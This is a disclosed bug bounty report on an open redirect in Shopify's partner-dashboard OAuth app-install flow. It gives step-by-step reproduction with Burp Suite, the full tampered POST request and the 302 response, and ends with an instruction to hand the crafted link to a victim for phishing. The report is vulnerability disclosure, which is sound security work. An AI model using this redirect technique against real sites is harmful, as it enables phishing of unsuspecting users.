# Open redirection in OAuth

## Report Details
- **Report ID**: 405697
- **URL**: https://hackerone.com/reports/405697
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-09-05T02:13:24.855Z
- **Disclosed**: 2018-09-24T18:01:16.797Z

## Reporter
- **Username**: dr_dragon
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
#steps to reproduce:
1-Open your shopify partner account.
2-Create an app and click on test your app.
3-Select a development store you own.
4-Intercept the request using burpsuite and change the "install_app[Select a store]" parameter to any store  with no validation.

The request like this:
```
POST /526915/apps/2544979/install_on_dev_shop HTTP/1.1
Host: partners.shopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://partners.shopify.com/526915/apps/2544979
Content-Type: application/x-www-form-urlencoded
Content-Length: 187
Cookie: last_shop=mido-2.myshopify.com; optimizelyEndUserId=oeu1536089316039r0.9037032785131875; _y=a60f12ee-9E2A-4EB5-93DA-34EC09FA1A95; _shopify_y=a60f12ee-9E2A-4EB5-93DA-34EC09FA1A95; _shopify_fs=2018-09-04T19%3A28%3A36.510Z; _ga=GA1.2.a60f12ee-9E2A-4EB5-93DA-34EC09FA1A95; _gid=GA1.2.352493204.1536089321; _ceg.s=pek3q2; _ceg.u=pek3q2; __hstc=138892268.672c096176060d98d2c72b786b0c0116.1536089327774.1536094057487.1536106976076.3; hubspotutk=672c096176060d98d2c72b786b0c0116; __utma=262205262.672852694.1536089354.1536089354.1536096223.2; __utmz=262205262.1536096223.2.2.utmcsr=partners.shopify.com|utmccn=(referral)|utmcmd=referral|utmcct=/; master_device_id=6b415960-b260-4a0a-a281-5c9b4be57c37; __hssrc=1; _partners_session=6cc122023cd45fc2becb197861cfd156; __utmc=262205262; __hssc=138892268.1.1536106976076
Connection: keep-alive
Upgrade-Insecure-Requests: 1

utf8=%E2%9C%93&authenticity_token=dO84UJSGLnRDTF3yLennlB1esNOx0SxdN0WJSGY8e%2F%2FquALL%2BQSBxb%2ByPgiyxRtoS8aCgQ83x33JxPAmrbHYdA%3D%3D&install_app%5BSelect+a+store%5D=$$.myshopify.com
```

The response like this :
```
HTTP/1.1 302 Found
Server: nginx/1.15.2
Date: Wed, 05 Sep 2018 01:01:51 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
Location: https://$$.myshopify.com/admin/oauth/redirect_from_partners_dashboard?client_id=04d42319b01049853db0281e6e68b0ea&signature=eyJleHBpcmVzX2F0IjoxNTM2MTA5NjExLCJwZXJtYW5lbnRfZG9tYWluIjoibWlkby0yLm15c2hvcGlmeS5jb20iLCJjbGllbnRfaWQiOiIwNGQ0MjMxOWIwMTA0OTg1M2RiMDI4MWU2ZTY4YjBlYSJ9--6b2892e6e4e0d4eea6ffad3ff5683f3aac2b61bb
X-Robots-Tag: none
Cache-Control: no-cache
X-Request-Id: e4c2d9e3a7f47203a309afb03f731b38
X-Runtime: 0.368401
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Dc: gke
X-Dc: gke
Content-Length: 391

<html><body>You are being <a href="https://$$.myshopify.com/admin/oauth/redirect_from_partners_dashboard?client_id=04d42319b01049853db0281e6e68b0ea&amp;signature=eyJleHBpcmVzX2F0IjoxNTM2MTA5NjExLCJwZXJtYW5lbnRfZG9tYWluIjoibWlkby0yLm15c2hvcGlmeS5jb20iLCJjbGllbnRfaWQiOiIwNGQ0MjMxOWIwMTA0OTg1M2RiMDI4MWU2ZTY4YjBlYSJ9--6b2892e6e4e0d4eea6ffad3ff5683f3aac2b61bb">redirected</a></body></html>
```
5-Copy this link between <a> tages and give it to the victim.
6-The victim will redirect :).

## Impact

Attacker can phish users.

## Attachments
No attachments
